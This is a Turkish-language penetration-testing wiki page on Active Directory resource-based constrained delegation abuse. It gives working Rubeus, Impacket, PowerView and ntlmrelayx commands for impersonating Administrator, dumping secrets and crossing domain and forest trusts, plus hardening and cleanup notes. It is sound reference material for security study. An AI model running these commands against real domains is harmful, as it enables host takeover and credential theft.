# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Resource-based constrained delegation (RBCD), [constrained delegation](constrained-delegation.md) ile benzerdir, ancak güven ilişkisi yönü tersine çevrilmiştir. Geleneksel constrained delegation, bir principal'ın hangi servislere delegation yapabileceğini kaydeder; RBCD ise **hedef resource** üzerinde hangi principal'ların bu resource'a kullanıcıları impersonate edebileceğini kaydeder.<sup>[[12]](#references)</sup>

Hedef nesnenin _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ attribute'u, bu resource üzerinde diğer identity'ler adına hareket etmesine izin verilen principal'ları tanımlayan bir security descriptor içerir.

Bir diğer önemli fark, bir machine account üzerinde yeterli **write permissions**'a (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` ve benzer haklar) sahip bir principal'ın _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ attribute'unu ayarlayabilmesidir. Geleneksel constrained delegation'ı yapılandırmak normalde daha ayrıcalıklı administrative access gerektirir.<sup>[[1]](#references)</sup>

Daha kesin olarak, klasik constrained-delegation ayarlarının değiştirilmesi normalde bir domain controller üzerindeki `SeEnableDelegationPrivilege` ile sınırlandırılır; bu hak genellikle highly privileged administrator'larda bulunur. RBCD, kararı hedef nesnenin security descriptor'una taşır; bu nedenle ilgili computer-object property'sine write access, bu user right olmadan yeterli olabilir.<sup>[[1]](#references)[[2]](#references)</sup>

### New Concepts

`userAccountControl` içindeki **`TrustedToAuthForDelegation`** flag'i genellikle **S4U2Self** için bir ön koşul olarak tanımlanır, ancak bu eksiktir.\
SPN'e sahip bir service principal, flag olmadan S4U2Self talep edebilir. `TrustedToAuthForDelegation` ile döndürülen service ticket **forwardable** olur; bu flag olmadan ticket normalde **non-forwardable** olur.<sup>[[5]](#references)</sup>

Geleneksel constrained delegation, S4U2Proxy adımında **non-forwardable TGS**'yi reddeder. RBCD, hedefin security descriptor'u talepte bulunan service'i authorize ettiğinde bu S4U2Self ticket'ını kabul edebilir.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack structure

> Bir **computer account** üzerinde **write-equivalent privileges**'a sahipseniz, bu machine'e privileged access elde edebilirsiniz.

Saldırganın **victim computer object** üzerinde zaten **write-equivalent privileges**'a sahip olduğunu varsayın.

1. Saldırgan, bir **SPN**'e sahip bir account'u **compromise** eder veya bir tane **oluşturur** ("Service A"). Varsayılan olarak, authenticated bir domain user, **_MachineAccountQuota_** tarafından kontrol edildiği üzere en fazla 10 computer object oluşturabilir; bir computer object otomatik olarak kullanılabilir SPN'ler sağlar.
2. Saldırgan, **ServiceA'nın victim computer (ServiceB) üzerinde impersonate any user yapmasına izin verecek şekilde resource-based constrained delegation** yapılandırmak için victim computer (ServiceB) üzerindeki WRITE privilege'ını **abuse** eder.
3. Saldırgan, **Service B** üzerinde privileged access'e sahip bir user için Service A'dan Service B'ye **full S4U attack** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus kullanır.
1. S4U2Self (compromised veya created SPN account'tan): **Administrator'ı Service A'ya temsil eden** bir **TGS** talep et (non-forwardable).
2. S4U2Proxy: **Administrator'ı** temsil eden bu **non-forwardable TGS**'yi kullanarak **victim host** için bir service ticket talep et.
3. Non-forwardable ticket, Service A hedef resource'un security descriptor'unda authorize edildiği için bu RBCD flow'unda yine de çalışabilir.
4. Saldırgan **pass-the-ticket** yapabilir ve **victim ServiceB**'ye **access** kazanmak için user'ı **impersonate** edebilir.<sup>[[1]](#references)</sup>

Domain'in _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bilgisayar Nesnesi Oluşturma

Etki alanı içinde **[powermad](https://github.com/Kevin-Robertson/Powermad)** kullanarak bir bilgisayar nesnesi oluşturabilirsiniz:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Yapılandırma Resource-based Constrained Delegation

**Active Directory PowerShell module kullanarak**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview kullanarak**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Complete S4U attack gerçekleştirme (Windows/Rubeus)

İlk olarak `123456` parolasıyla yeni Computer object'i oluşturduk, bu nedenle bu parolanın hash'ine ihtiyacımız var:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, söz konusu hesap için RC4 ve AES hash'lerini yazdırır.\
Artık saldırı gerçekleştirilebilir:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak tek bir istekte daha fazla service için daha fazla ticket oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcılar **"Hesap hassastır ve temsilci olarak atanamaz."** olarak işaretlenebilir. Bu işaret etkinse hesap, bu delegation akışı üzerinden taklit edilemez. BloodHound, analiz sırasında bu özelliği gösterir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux üzerinden çalışıyorsanız, resmi Impacket araçlarını kullanarak tüm RBCD zincirini gerçekleştirebilirsiniz:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notlar
- LDAP signing/LDAPS zorunlu kılınmışsa `impacket-rbcd -use-ldaps ...` kullanın.
- AES anahtarlarını tercih edin; birçok modern domain RC4'ü kısıtlar. Impacket ve Rubeus, yalnızca AES kullanan akışları destekler.
- Impacket, bazı araçlar için `sname` değerini ("AnySPN") yeniden yazabilir; ancak mümkün olduğunda doğru SPN'yi alın (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Kontrol ettiğiniz **delegating principal**, **resource computer** ile **farklı bir domain'de** (hatta **farklı bir forest'ta**) bulunuyorsa abuse hâlâ **RBCD**'dir; ancak ticket akışı artık alışılmış tek-domain `S4U2Self -> S4U2Proxy` akışı değildir.

### Cross-domain RBCD: configure the foreign principal by SID

`msDS-AllowedToActOnBehalfOfOtherIdentity` değerini **farklı bir domain'den** ayarladığınızda, foreign machine/user target domain LDAP'ta **isimle çözümlenemeyebilir**. Bu durumda delegation entry'sini foreign principal'ın sAMAccountName/UPN'si yerine **SID**'sini kullanarak yapılandırın.

Bu durum özellikle `ntlmrelayx.py` ile NTLM'yi LDAP'a relay ederken önemlidir:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notlar:
- `--sid`, `ntlmrelayx.py` aracına `--escalate-user` değerini SID olarak ele almasını söyler; delegating account hedef domain'e foreign olduğunda bu gereklidir.
- Araç `User not found in LDAP` çıktısını verse bile delegation write işlemi başarılı olabilir; çünkü security descriptor foreign SID'yi doğrudan depolar.

### Cross-domain RBCD: cross-realm S4U sequence

Foreign principal `msDS-AllowedToActOnBehalfOfOtherIdentity` içine eklendikten sonra çalışan cross-domain akışı şöyledir:<sup>[[9]](#references)[[13]](#references)</sup>

1. Delegating principal için kendi domain'inden bir **TGT** alın.
2. `krbtgt/<target-domain>` için bir **referral TGT** isteyin.
3. Target-domain DC üzerinde impersonated user için bir **cross-realm S4U2Self referral** isteyin.
4. Bu user için gerçek **S4U2Self** ticket'ını delegator domain'inde tekrar isteyin.
5. Target domain için bir referral ticket almak üzere delegator domain'inde **S4U2Proxy** gerçekleştirin.
6. `cifs/host.target`, `host/host.target` vb. için service ticket almak üzere target-domain DC üzerinde final **S4U2Proxy** işlemini gerçekleştirin.

Stock Linux tooling'in cross-domain RBCD'de çoğunlukla başarısız olmasının nedeni budur:<sup>[[9]](#references)</sup>
- request **realm** değeri, `TGS-REQ` içinde kullanılan TGT'nin realm değerinden farklı olmak zorunda olabilir
- zincir yalnızca **S4U2Self** veya hemen ardından tek bir **S4U2Proxy** değil, **independent S4U2Proxy steps** gerektirir

### Cross-domain RBCD from Linux

Synacktiv, iki KDC'yi açıkça işleyerek cross-realm sequence'i Linux üzerinden yeniden oluşturan bir Impacket `getST.py` implementation'ı yayımladı:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operasyonel olarak yeni argümanlar şunlardır:
- `-dc-ip`: **delegating** domain'in DC'si
- `-targetdomain`: **resource computer**'ın domain'i
- `-targetdc`: **resource** domain'in DC'si

### Cross-forest RBCD limitations

Cross-forest RBCD'nin önemli bir kısıtlaması vardır: **impersonated user, delegating principal ile aynı forest'a ait olmalıdır**. Başka bir deyişle, kontrolünüzdeki machine account `valhalla.local` içinde ve hedef resource `asgard.local` içinde bulunuyorsa, RBCD üzerinden bu resource'a rastgele **`asgard.local` kullanıcılarını impersonate** edemezsiniz.<sup>[[9]](#references)</sup>

Şu durumlarda yine de exploit edilebilir:
- **delegating forest** kullanıcısı, diğer forest'taki resource host üzerinde **local admin** (veya başka şekilde privileged) ise
- Bir trust gerekli authentication path'ine izin veriyorsa ve foreign SID, hedef computer'ın security descriptor'ında kabul ediliyorsa

### Cross-forest RBCD protocol quirks

Cross-forest RBCD yalnızca "cross-domain plus a trust" değildir. Gözlemlenen flow, yaygın tooling'in geçmişte gözden kaçırdığı iki ayrıntı içerir:<sup>[[9]](#references)</sup>

1. `PA-PAC-OPTIONS=branch-aware` ayarlayan ek bir **S4U2Proxy** request'i
2. Diğer etypes istenmiş olsa bile **RC4** kullanılarak döndürülebilen final service ticket

Pratik flow şöyledir:

1. Forest A'daki delegating principal için bir TGT alın.
2. Forest A'daki impersonated user için **S4U2Self** request'i gönderin.
3. Forest A'da, forest B için bir referral TGT elde etmek üzere **S4U2Proxy** request'i gönderin.
4. Forest A'da, **S4U2Self ticket'ını additional ticket olarak kullanmadan**, ancak `branch-aware` etkin olacak şekilde ikinci bir **S4U2Proxy** göndererek forest B için başka bir referral TGT elde edin.
5. İsteğe bağlı olarak forest B'de delegating principal için normal bir service ticket isteyin (bu ticket final abuse için gerekli değildir).
6. 3. ve 4. adımlardaki referral ticket'ları kullanarak forest B'de, impersonated forest-A user için hedef SPN'ye yönelik final **S4U2Proxy** ticket'ını isteyin.

### Cross-forest RBCD from Linux

Aynı Synacktiv Impacket branch'i bu logic için bir `-forest` switch'i ekler:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forests** içinde hem **S4U2Self** hem de **S4U2Proxy**, tek bir referral sonrasında durmak yerine **recursive** olabilir:

- **Recursive S4U2Self**: ilk `S4U2Self`, **impersonated user's domain**'ine gönderilir; ara parent/child geçişleri, `krbtgt/<REALM>` için normal `TGS-REQ` referral'larıyla gerçekleştirilir ve **final `S4U2Self`**, **delegating principal's own domain**'inde gönderilir.
- Bu, yalnızca bir makine hesabı için **TGT** bulundurmanın, aynı forest içindeki başka bir domain'den bir admin'i impersonate etmek ve `cifs/host`, `host/host`, `wsman/host` vb. için request yapmak adına yeterli olabileceği anlamına gelir.
- **Recursive S4U2Proxy** de trust chain'i aynı şekilde takip eder: ara geçişlerde, sonraki `krbtgt/<REALM>` referral'ını request ederken önceki ticket **TGT** olarak yeniden kullanılır ve yalnızca son hop final service ticket'ı döndürür.<sup>[[10]](#references)</sup>

Pratik bir same-forest örneği:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

**Delegation yapan principal, SPN'siz bir kullanıcıysa**, son recursive `S4U2Self`, **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** hatasıyla başarısız olur. Geçici çözüm, yalnızca son hop'u **`S4U2Self+U2U`** olarak yeniden denemektir.<sup>[[10]](#references)</sup>

Abuse chain'in kısa özeti:

1. KDC'yi **RC4-HMAC (etype 23)** kullanmaya yönlendirmek için **NT hash** ile authenticate olun.
2. Önce **`-self -u2u`** isteğinde bulunun ve bu ticket'ı sonraki proxy adımından ayrı tutun.
3. `describeTicket.py` ile **TGT session key**'ini çıkarın.
4. `changepasswd.py -newhashes <session_key>` kullanarak kullanıcının **NT hash**'ini bu **session key** ile değiştirin.
5. `S4U2Self+U2U` ticket'ını ayrı bir **`-proxy`** isteği sırasında **`-additional-ticket`** olarak yeniden kullanın.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operasyonel dikkat edilmesi gerekenler:

- **first trusted hop is already another forest** olduğunda, native Windows davranışıyla eşleşmesi için **branch-aware** algoritmayı (`getST.py ... -forest`) tercih edin. Yabancı forest zincirde yalnızca **daha sonraki** bir aşamada ulaşılıyorsa, **branch-aware** olmayan recursive akış yine de çalışabilir.<sup>[[9]](#references)</sup>
- Güncel **Windows Server 2022/2025** DC'lerinde, RC4 kullanımı zorlandığında RC4'ün kullanım dışı bırakılması nedeniyle **`KDC_ERR_ETYPE_NOSUPP`** hatası alınabilir; bu durum, klasik SPN-backed RBCD AES ile çalışmaya devam etse bile **SPN-less RBCD**'yi imkansız hale getirebilir.<sup>[[15]](#references)</sup>
- Kullanıcının hash/password değerini değiştirmeden önce **`S4U2Self+U2U`** çalıştırın: `SamrChangePasswordUser`, hesabın Kerberos AES anahtarlarını yeniden hesaplamaz; bu nedenle password değişikliğini önce yapmak, sonraki ticket isteklerini bozabilir.<sup>[[14]](#references)</sup>
- Impersonation yapılan hesap hâlâ **delegable** olmalıdır: **Protected Users** ve **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** özelliklerine sahip hesaplar zinciri engeller.

## Detection / hardening notes

- Domain/forest'ler arasındaki RBCD yolları hâlâ genellikle **ACL abuse** veya **relay-to-LDAP** yoluyla oluşturulur. Yaygın kurulum yollarını engellemek için DC'lerde **LDAP signing** ve **LDAP channel binding** uygulayın.
- Computer object'leri üzerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` yazma yetkisine sahip olanları denetleyin ve **foreign security principals** dahil olmak üzere kaydedilen SID'leri çözümleyin.
- Trust ağırlıklı ortamlarda **Selective Authentication**, **SID filtering** ve yabancı forest'tan gelen kullanıcıların resource host'lar üzerinde **local admin** yetkilerine sahip olup olmadığını gözden geçirin.

### Erişim

Son command line, **complete S4U attack** işlemini gerçekleştirecek ve Administrator'dan victim host'a alınan TGS'yi **memory** içine inject edecektir.\
Bu örnekte Administrator'dan **CIFS** service'i için bir TGS istendiğinden, **C$**'a erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı service ticket'ları kötüye kullanma

[**Mevcut service ticket'lar hakkında buradan bilgi edinin**](silver-ticket.md#available-services).

## Enumerasyon, denetim ve temizleme

### RBCD yapılandırılmış bilgisayarları enumerate etme

PowerShell (SID'leri çözümlemek için SD'nin kodunu çözme):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (tek bir komutla oku veya temizle):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (clear the attribute):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini sağlayın (veya rc4, aes128 ve aes256 hash'lerinin tümünü sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- Normal bir kullanıcı için `-self` sırasında **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: delegating principal'ın büyük olasılıkla **SPN'i yoktur**. Normal bir **`S4U2Self`** yerine **`S4U2Self+U2U`** kullanarak **son hop'u** yeniden deneyin.<sup>[[10]](#references)</sup>
- **SPN-less RBCD** sırasında **`KDC_ERR_ETYPE_NOSUPP`**: güncel DC'ler, **`S4U2Self+U2U`** + session-key-substitution hilesi için gereken zorlanmış **RC4-HMAC** yolunu reddedebilir. Bunun yerine AES kullanan klasik **SPN-backed** RBCD yolunu deneyin.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saatinin DC'nin saatinden farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin login işlemi için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" işaretini koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Şunlar anlamına gelebilir:
- Impersonate etmeye çalıştığınız kullanıcı istenen service'e erişemiyor (çünkü onu impersonate edemezsiniz veya yeterli privilege'a sahip değildir)
- İstenen service mevcut değil (winrm için ticket istiyorsanız ancak winrm çalışmıyorsa)
- Oluşturulan fakecomputer, vulnerable server üzerindeki privilege'larını kaybetmiştir ve bunları geri vermeniz gerekir.
- Klasik KCD'yi abuse ediyorsunuz; RBCD'nin forwardable olmayan S4U2Self ticket'larıyla, KCD'nin ise forwardable ticket'larla çalıştığını unutmayın.

## Notlar, relay'ler ve alternatifler

- LDAP filtered ise RBCD SD'sini AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz.:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain'leri, tek adımda local SYSTEM elde etmek için sıklıkla RBCD ile sonlanır. Uygulamalı, uçtan uca örnekler için bkz.:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding **devre dışıysa** ve bir machine account oluşturabiliyorsanız, **KrbRelayUp** gibi araçlar zorlanmış bir Kerberos auth işlemini LDAP'a relay edebilir, hedef computer object üzerindeki machine account'unuz için `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini ayarlayabilir ve off-host üzerinden S4U aracılığıyla hemen **Administrator** impersonate edebilir.<sup>[[8]](#references)</sup>

## References

- [1] [Resource-Based Constrained Delegation'ı Abuse Ederek Active Directory'ye Saldırmak: Wagging the Dog](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation Hakkında Başka Bir Söz – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Offensive Kerberos'a Genel Bakış](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (resmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Güncel syntax ile hızlı Linux cheatsheet'i](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing kapalı → Kerberos relay ile RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Cross-domain ve cross-forest RBCD'yi incelemek](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Cross-domain ve cross-forest RBCD'yi incelemek: 2. kısım](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation'a genel bakış](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos'ta RC4 kullanımını tespit etme ve düzeltme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy ayrıntıları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
